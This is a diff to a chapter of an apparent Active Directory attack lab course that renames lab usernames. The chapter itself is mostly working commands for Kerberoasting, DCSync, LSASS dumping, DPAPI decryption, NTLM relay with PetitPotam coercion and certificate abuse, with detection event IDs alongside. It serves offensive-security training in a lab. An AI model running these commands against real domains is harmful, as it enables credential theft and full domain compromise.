@@ -51,14 +51,14 @@ The arrows above are the rest of this chapter.
 
 ```
 ~/dvad/loot/02-cred/
-├── kerberoast/svc_sql.hash
-├── kerberoast/svc_sql.cracked.txt
+├── kerberoast/svc_jarvis.hash
+├── kerberoast/svc_jarvis.cracked.txt
 ├── asreproast/svc_legacy.hash
 ├── dcsync/ntds.full.txt
 ├── dcsync/krbtgt.nt
 ├── lsass/file01-l.dmp
 ├── lsass/file01-pypykatz.txt
-├── dpapi/alice-vault.txt
+├── dpapi/peter.parker-vault.txt
 ├── relay/dc01.pfx
 ├── relay/dc01.nthash
 ├── shadow/sql01.pfx
@@ -94,13 +94,13 @@ By design, Kerberos requires no privilege to request a TGS — you can request a
 
 ```bash
 # Via LDAP — find every kerberoastable account
-ldapsearch -x -H ldap://10.10.0.10 -D 'alice@corp.local' -w 'DVADlab2024!' \
+ldapsearch -x -H ldap://10.10.0.10 -D 'peter.parker@corp.local' -w 'DVADlab2024!' \
     -b 'DC=corp,DC=local' \
     '(&(samAccountType=805306368)(servicePrincipalName=*))' \
     samAccountName servicePrincipalName description memberOf
 
 # Or via impacket (shorthand)
-impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
+impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
 ```
 
 You want the `sAMAccountName` + `servicePrincipalName` for each. Save to disk.
@@ -108,7 +108,7 @@ You want the `sAMAccountName` + `servicePrincipalName` for each. Save to disk.
 ### Roast all
 
 ```bash
-impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' \
+impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' \
     -dc-ip 10.10.0.10 \
     -request \
     -outputfile ~/dvad/loot/02-cred/kerberoast/all.hash
@@ -117,7 +117,7 @@ impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' \
 Hash format (mode 13100 = RC4, mode 19700 = AES256):
 
 ```
-$krb5tgs$23$*svc_sql$CORP.LOCAL$cifs/sql01.corp.local*$10b9...$f7d3...0a1b
+$krb5tgs$23$*svc_jarvis$CORP.LOCAL$cifs/sql01.corp.local*$10b9...$f7d3...0a1b
 ```
 
 The `23` denotes RC4. `18` would denote AES256 (mode 19700).
@@ -129,7 +129,7 @@ If the account supports AES, the KDC will issue an AES-encrypted TGS by default 
 ```bash
 # Impacket --request with --hashes uses RC4 by default
 # To explicitly downgrade with Rubeus:
-.\Rubeus.exe kerberoast /tgtdeleg /user:svc_sql /rc4opsec
+.\Rubeus.exe kerberoast /tgtdeleg /user:svc_jarvis /rc4opsec
 ```
 
 Why this works: the KDC picks the strongest etype **both sides** support. If the requester advertises only RC4, RC4 wins — but the *service account* must have `msDS-SupportedEncryptionTypes` allowing RC4. Default user accounts do (legacy compat).
@@ -142,15 +142,15 @@ You have GenericWrite on a user → add an SPN → roast → revert:
 
 ```bash
 # Add SPN
-bloodyAD -d corp.local -u alice -p 'DVADlab2024!' --host 10.10.0.10 \
+bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
          add objectAttribute victim_user servicePrincipalName 'cifs/anything.corp.local'
 
 # Roast
-impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
+impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
     -request-user victim_user -outputfile victim.hash
 
 # Remove SPN (housekeeping; not strictly required if you don't care about noise)
-bloodyAD -d corp.local -u alice -p 'DVADlab2024!' --host 10.10.0.10 \
+bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
          remove objectAttribute victim_user servicePrincipalName 'cifs/anything.corp.local'
 ```
 
@@ -180,9 +180,9 @@ hashcat -m 13100 hashes -a 3 ?u?l?l?l?l?l?l?d?d?s
 
 ```
 EventID 4769 (TGS issued)
-  ServiceName: svc_sql$
+  ServiceName: svc_jarvis$
   TicketEncryptionType: 0x17 (RC4 — anomalous if AES expected)
-  AccountName: alice
+  AccountName: peter.parker
 ```
 
 ---
@@ -207,7 +207,7 @@ ldapsearch ... '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' samAccount
 
 ```bash
 # Authenticated (auto-finds all DONT_REQ_PREAUTH accounts)
-impacket-GetNPUsers corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
+impacket-GetNPUsers corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
     -request -outputfile ~/dvad/loot/02-cred/asreproast/all.hash
 
 # Unauthenticated (need a username list)
@@ -218,7 +218,7 @@ impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip 10.10.0.10 
 Hash format (mode 18200):
 
 ```
-$krb5asrep$23$alice@CORP.LOCAL:c5...:fc...
+$krb5asrep$23$peter.parker@CORP.LOCAL:c5...:fc...
 ```
 
 ### Crack
@@ -235,7 +235,7 @@ hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -r best64.rule
 EventID 4768 (TGT issued)
   PreAuthType: 0
   Status: 0x0
-  TargetUserName: alice
+  TargetUserName: peter.parker
 ```
 
 `PreAuthType=0` is the giveaway.
@@ -254,7 +254,7 @@ A non-DC principal who has these ACEs can call DRSR and ask the DC for the data 
 
 ```bash
 # Find principals with DCSync ACEs
-bloodyAD -d corp.local -u alice -p 'DVADlab2024!' --host 10.10.0.10 \
+bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
          get dnsDump | jq '.[] | select(.ace_list[].right=="DS-Replication-Get-Changes-All")'
 
 # Or via BloodHound: 'Find Principals with DCSync Rights' query.
@@ -264,24 +264,24 @@ bloodyAD -d corp.local -u alice -p 'DVADlab2024!' --host 10.10.0.10 \
 
 ```bash
 # Full dump (every account)
-impacket-secretsdump corp.local/sync_user:'DVADlab2024!'@10.10.0.10 -just-dc \
+impacket-secretsdump corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10 -just-dc \
     -outputfile ~/dvad/loot/02-cred/dcsync/ntds-full
 
 # Target krbtgt only (smaller, quieter)
-impacket-secretsdump corp.local/sync_user:'DVADlab2024!'@10.10.0.10 -just-dc \
+impacket-secretsdump corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10 -just-dc \
     -just-dc-user krbtgt
 
 # Target Administrator only
-impacket-secretsdump corp.local/sync_user:'DVADlab2024!'@10.10.0.10 -just-dc \
+impacket-secretsdump corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10 -just-dc \
     -just-dc-user Administrator
 
 # With hash (instead of password)
-impacket-secretsdump -hashes :<sync_user_NT> corp.local/sync_user@10.10.0.10 \
+impacket-secretsdump -hashes :<sync_user_NT> corp.local/doctor.strange@10.10.0.10 \
     -just-dc
 
 # With Kerberos ticket
-KRB5CCNAME=alice.ccache impacket-secretsdump -k -no-pass \
-    corp.local/sync_user@dc01.corp.local -just-dc
+KRB5CCNAME=peter.parker.ccache impacket-secretsdump -k -no-pass \
+    corp.local/doctor.strange@dc01.corp.local -just-dc
 ```
 
 ### Output format
@@ -314,7 +314,7 @@ EventID 4662
   ObjectName: DC=corp,DC=local
   Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}   # DS-Replication-Get-Changes
               {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}   # DS-Replication-Get-Changes-All
-  Accessing: sync_user (non-DC)
+  Accessing: doctor.strange (non-DC)
 ```
 
 Defender for Identity flags this natively as "Suspected DCSync attack."
@@ -365,9 +365,9 @@ mimikatz# sekurlsa::logonpasswords
 4. **lsassy** (impacket-based, remote, no file on disk):
 
 ```bash
-nxc smb 10.10.0.13 -u alice -p 'DVADlab2024!' --local-auth -M lsassy
+nxc smb 10.10.0.13 -u peter.parker -p 'DVADlab2024!' --local-auth -M lsassy
 # Or with method selection:
-lsassy -u alice -p 'DVADlab2024!' -d corp.local -M procdump 10.10.0.13
+lsassy -u peter.parker -p 'DVADlab2024!' -d corp.local -M procdump 10.10.0.13
 ```
 
 5. **MalSecLogon / NanoDump / pypykatz live** (very stealthy):
@@ -394,19 +394,19 @@ Sample output:
 == LogonSession ==
 authentication_id 1234567 (12d687)
 session_id 2
-username svc_sql
+username svc_jarvis
 domainname CORP
 logon_server DC01
 logon_time 2026-05-21T16:32:11
 sid S-1-5-21-...-1116
 secrets:
         == NT ==
-                username svc_sql
+                username svc_jarvis
                 domain CORP
                 lm_hash NA
                 nt_hash 8846f7eaee8fb117ad06bdd830b7586c
         == Kerberos ==
-                username svc_sql
+                username svc_jarvis
                 domain CORP.LOCAL
                 password SqlServer123!         <-- WDigest leaked
 ```
@@ -476,7 +476,7 @@ Encrypted with a key derived from the user's plaintext password. **You need eith
 
 ```bash
 # As any DA-equivalent
-impacket-dpapi backupkeys -t corp.local/sync_user:'DVADlab2024!'@10.10.0.10 \
+impacket-dpapi backupkeys -t corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10 \
     --export
 
 # Saves backupkey.pvk
@@ -489,19 +489,19 @@ This key was generated at domain creation and **never rotates** (intentional —
 ```bash
 # 1. Master key file from the user's profile
 impacket-dpapi masterkey \
-    -file 'C:\Users\alice\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>' \
+    -file 'C:\Users\peter.parker\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>' \
     -pvk backupkey.pvk
 
 # Output: master key = abc123...
 
 # 2. Credential blob (saved RDP cred)
 impacket-dpapi credential \
-    -file 'C:\Users\alice\AppData\Local\Microsoft\Credentials\<GUID>' \
+    -file 'C:\Users\peter.parker\AppData\Local\Microsoft\Credentials\<GUID>' \
     -key abc123...
 
 # 3. Chrome / Edge
 impacket-dpapi chrome \
-    -file 'C:\Users\alice\AppData\Local\Google\Chrome\User Data\Default\Login Data' \
+    -file 'C:\Users\peter.parker\AppData\Local\Google\Chrome\User Data\Default\Login Data' \
     -key abc123...
 ```
 
@@ -564,7 +564,7 @@ sudo ntlmrelayx.py \
     --output-file ~/dvad/loot/02-cred/relay/ntlmrelayx.txt
 
 # Terminal 2 — coerce file01 to auth to us
-python3 PetitPotam.py -d corp.local -u alice -p 'DVADlab2024!' \
+python3 PetitPotam.py -d corp.local -u peter.parker -p 'DVADlab2024!' \
     attacker.corp.local 10.10.0.13
 ```
 
@@ -601,7 +601,7 @@ sudo ntlmrelayx.py \
     -smb2support \
     --output-file ~/dvad/loot/02-cred/relay/esc8.txt
 
-python3 PetitPotam.py -d corp.local -u alice -p 'DVADlab2024!' \
+python3 PetitPotam.py -d corp.local -u peter.parker -p 'DVADlab2024!' \
     attacker.corp.local 10.10.0.10
 ```
 
@@ -618,7 +618,7 @@ sudo ntlmrelayx.py \
     -c 'powershell -enc <base64>' \
     --no-validate-privs
 
-python3 PetitPotam.py -d corp.local -u alice -p 'DVADlab2024!' \
+python3 PetitPotam.py -d corp.local -u peter.parker -p 'DVADlab2024!' \
     attacker.corp.local 10.10.0.100  # coerce ws01 → relay to ws01? No — coerce DIFFERENT host
 ```
 
@@ -660,13 +660,13 @@ If you also have `GenericWrite` on a target computer object, you can:
 
 ```bash
 # Step 1 — make a computer
-impacket-addcomputer 'corp.local/alice:DVADlab2024!' \
+impacket-addcomputer 'corp.local/peter.parker:DVADlab2024!' \
     -dc-ip 10.10.0.10 \
     -computer-name 'EVIL$' \
     -computer-pass 'EvilPass1!'
 
 # Step 2 — write RBCD on target
-impacket-rbcd corp.local/alice:'DVADlab2024!' \
+impacket-rbcd corp.local/peter.parker:'DVADlab2024!' \
     -dc-ip 10.10.0.10 \
     -delegate-from 'EVIL$' \
     -delegate-to 'FILE01$' \
@@ -735,7 +735,7 @@ Introduced for Windows Hello for Business (paired with the device's TPM-resident
 
 ```bash
 certipy shadow auto \
-    -u alice@corp.local -p 'DVADlab2024!' \
+    -u peter.parker@corp.local -p 'DVADlab2024!' \
     -dc-ip 10.10.0.10 \
     -account 'sql01$'
 ```
@@ -766,17 +766,17 @@ Output:
 
 ```bash
 # 1. Generate key + DeviceID
-certipy shadow add -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
+certipy shadow add -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
         -account 'sql01$' -out keycred.pfx
 
 # 2. PKINIT
 certipy auth -pfx keycred.pfx -dc-ip 10.10.0.10
 
 # 3. Read the planted KeyCredentialLink (sanity-check)
-certipy shadow list -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -account 'sql01$'
+certipy shadow list -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -account 'sql01$'
 
 # 4. Remove
-certipy shadow remove -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
+certipy shadow remove -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 \
         -account 'sql01$' -device-id <device-guid>
 ```
 
@@ -829,11 +829,11 @@ See chapter 06 for the full ESC catalogue. Quick reference of which DVAD CRED ma
 
 ```bash
 # Find vulnerable template
-certipy find -u alice@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -vulnerable
+certipy find -u peter.parker@corp.local -p 'DVADlab2024!' -dc-ip 10.10.0.10 -vulnerable
 
 # Enroll with SAN spoof
 certipy req \
-    -u alice@corp.local -p 'DVADlab2024!' \
+    -u peter.parker@corp.local -p 'DVADlab2024!' \
     -ca CORP-CA -target ca01.corp.local \
     -template VulnerableESC1 \
     -upn 'administrator@corp.local'
@@ -847,11 +847,11 @@ certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
 
 ```bash
 # Create computer
-impacket-addcomputer corp.local/alice:'DVADlab2024!' \
+impacket-addcomputer corp.local/peter.parker:'DVADlab2024!' \
     -computer-name 'EVIL$' -computer-pass 'EvilPass1!' -dc-ip 10.10.0.10
 
 # Set its dNSHostName to dc01.corp.local
-bloodyAD -d corp.local -u alice -p 'DVADlab2024!' --host 10.10.0.10 \
+bloodyAD -d corp.local -u peter.parker -p 'DVADlab2024!' --host 10.10.0.10 \
     set objectAttribute 'EVIL$' dNSHostName dc01.corp.local
 
 # Enroll Machine template — cert will be issued to DC01's identity
@@ -871,7 +871,7 @@ Patch: KB5014754 (May 2022). Adds `szOID_NTDS_CA_SECURITY_EXT` to bind cert to S
 ### xp_cmdshell as SYSTEM (or service account)
 
 ```bash
-impacket-mssqlclient corp.local/alice:'DVADlab2024!'@10.10.0.14 -windows-auth
+impacket-mssqlclient corp.local/peter.parker:'DVADlab2024!'@10.10.0.14 -windows-auth
 
 1> SELECT IS_SRVROLEMEMBER('sysadmin')
 1> EXEC sp_configure 'show advanced options', 1; RECONFIGURE
@@ -952,13 +952,13 @@ $LDAP "(objectClass=msDS-GroupManagedServiceAccount)" \
 The `msDS-GroupMSAMembership` is a SDDL-encoded SD. To read it:
 
 ```bash
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' -M gmsa
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -M gmsa
 ```
 
 If your account is in the readers list:
 
 ```bash
-gMSADumper.py -u alice -p 'DVADlab2024!' -d corp.local -l 10.10.0.10
+gMSADumper.py -u peter.parker -p 'DVADlab2024!' -d corp.local -l 10.10.0.10
 ```
 
 Output:
@@ -989,7 +989,7 @@ impacket-psexec -k -no-pass 'corp.local/svc_gmsa$@target'
 ### Legacy LAPS
 
 ```bash
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --dump-laps
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --dump-laps
 # Or via ldapsearch
 $LDAP "(ms-Mcs-AdmPwd=*)" sAMAccountName ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime
 ```
@@ -999,7 +999,7 @@ $LDAP "(ms-Mcs-AdmPwd=*)" sAMAccountName ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTi
 Attribute changed to `msLAPS-Password` (cleartext when no encryption configured) and `msLAPS-EncryptedPassword` (DPAPI-NG encrypted when enabled).
 
 ```bash
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' -M laps
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -M laps
 ```
 
 NetExec's `laps` module handles legacy + Windows LAPS encryption decoding automatically.
@@ -1037,19 +1037,19 @@ impacket-psexec -k -no-pass 'corp.local/Administrator@dc01.corp.local'
 
 ```bash
 # Inject a kirbi or ccache
-export KRB5CCNAME=alice.ccache
+export KRB5CCNAME=peter.parker.ccache
 
 # Convert kirbi → ccache (Rubeus → impacket)
-impacket-ticketConverter alice.kirbi alice.ccache
+impacket-ticketConverter peter.parker.kirbi peter.parker.ccache
 
 # Or the other way
-impacket-ticketConverter alice.ccache alice.kirbi
+impacket-ticketConverter peter.parker.ccache peter.parker.kirbi
 ```
 
 On Windows (Rubeus):
 
 ```
-PS> Rubeus.exe ptt /ticket:alice.kirbi
+PS> Rubeus.exe ptt /ticket:peter.parker.kirbi
 PS> klist
 PS> dir \\dc01.corp.local\C$
 ```
@@ -1058,10 +1058,10 @@ PS> dir \\dc01.corp.local\C$
 
 ```bash
 # Use cert directly with certipy (PKINIT)
-certipy auth -pfx alice.pfx -dc-ip 10.10.0.10
+certipy auth -pfx peter.parker.pfx -dc-ip 10.10.0.10
 
 # Or generate a TGT and PTT
-KRB5CCNAME=alice.ccache impacket-psexec -k -no-pass 'corp.local/alice@target'
+KRB5CCNAME=peter.parker.ccache impacket-psexec -k -no-pass 'corp.local/peter.parker@target'
 ```
 
 ### Overpass-the-hash (the hybrid)
@@ -1140,7 +1140,7 @@ impacket-secretsdump -system system.save -security security.save LOCAL
 Output includes:
 
 ```
-$DCC2$10240#alice#abcdef1234567890abcdef1234567890
+$DCC2$10240#peter.parker#abcdef1234567890abcdef1234567890
 ```
 
 Hashcat mode 2100:
@@ -1219,7 +1219,7 @@ awk 'length($0) >= 12' rockyou.txt > rockyou-12plus.txt
 A `.pfx` whose private key is password-protected:
 
 ```bash
-pfx2john alice.pfx > pfx.hash
+pfx2john peter.parker.pfx > pfx.hash
 hashcat -m 9700 pfx.hash /usr/share/wordlists/rockyou.txt
 # Mode 9700 = Office 2007 — pfx may need 9710 or 9810; see hashcat doc
 ```
@@ -1252,8 +1252,8 @@ Hashcat modes:
 ```
 Step | Action                                              | What changes
 -----+-----------------------------------------------------+--------------
-  1  | Responder LLMNR poison → bob NetNTLMv2              | bob's plaintext (after crack)
-  2  | Kerberoast svc_sql → hashcat 13100                  | svc_sql plaintext
+  1  | Responder LLMNR poison → tony.stark NetNTLMv2              | tony.stark's plaintext (after crack)
+  2  | Kerberoast svc_jarvis → hashcat 13100                  | svc_jarvis plaintext
   3  | impacket-mssqlclient ... -windows-auth + xp_cmdshell| SYSTEM on sql01
   4  | comsvcs MiniDump lsass → pypykatz                   | NT hashes for everyone on sql01
   5  |   - svc_backup (Backup Operators) NT hash captured  | path to DC
@@ -1272,9 +1272,9 @@ Every step replaces one credential form with another. Recon then exploit then re
 ### Exercise 10.A — Roast everything
 
 ```bash
-impacket-GetNPUsers corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
+impacket-GetNPUsers corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
     -request -outputfile ~/dvad/loot/02-cred/asreproast/all.hash
-impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
+impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
     -request -outputfile ~/dvad/loot/02-cred/kerberoast/all.hash
 
 hashcat -m 18200 ~/dvad/loot/02-cred/asreproast/all.hash rockyou.txt -r best64.rule
@@ -1286,7 +1286,7 @@ Record cracked plaintexts and what privileges each grants.
 ### Exercise 10.B — DCSync
 
 ```bash
-impacket-secretsdump corp.local/sync_user:'DVADlab2024!'@10.10.0.10 \
+impacket-secretsdump corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10 \
     -just-dc-user krbtgt -outputfile ~/dvad/loot/02-cred/dcsync/krbtgt
 ```
 
@@ -1295,7 +1295,7 @@ Save the krbtgt NT hash, AES128, AES256 separately. You'll need them in chapter 
 ### Exercise 10.C — Shadow Credentials
 
 ```bash
-certipy shadow auto -u alice@corp.local -p 'DVADlab2024!' \
+certipy shadow auto -u peter.parker@corp.local -p 'DVADlab2024!' \
     -dc-ip 10.10.0.10 -account 'sql01$'
 impacket-psexec -hashes :<sql01$_NT> 'corp.local/sql01$@sql01.corp.local'
 ```
@@ -1325,20 +1325,20 @@ Compare what `pypykatz` extracts from each. Note the size and any AV/Defender co
 ### Exercise 10.F — DPAPI walkthrough
 
 1. As an admin, extract the domain backup key from corp.local.
-2. Pull bob's master key file off ws01.
+2. Pull tony.stark's master key file off ws01.
 3. Decrypt master key with backup pvk.
-4. Decrypt bob's saved Chrome login DB.
+4. Decrypt tony.stark's saved Chrome login DB.
 
 ### Exercise 10.G — gMSA dump
 
-Find a gMSA in corp.local (use ENUM-045 from chapter 08). Identify the readers group. Add `alice` to the readers group (only possible if you have GenericWrite on that group). Dump the gMSA password with `gMSADumper.py`.
+Find a gMSA in corp.local (use ENUM-045 from chapter 08). Identify the readers group. Add `peter.parker` to the readers group (only possible if you have GenericWrite on that group). Dump the gMSA password with `gMSADumper.py`.
 
 ### Exercise 10.H — ESC1 → DA
 
 ```bash
-certipy find -u alice -p ... -dc-ip 10.10.0.10 -vulnerable
+certipy find -u peter.parker -p ... -dc-ip 10.10.0.10 -vulnerable
 # pick a template tagged ESC1
-certipy req -u alice -p ... -ca CORP-CA -template Vuln -upn administrator@corp.local
+certipy req -u peter.parker -p ... -ca CORP-CA -template Vuln -upn administrator@corp.local
 certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
 impacket-secretsdump -hashes :<adm_nt> corp.local/Administrator@dc01.corp.local -just-dc
 ```
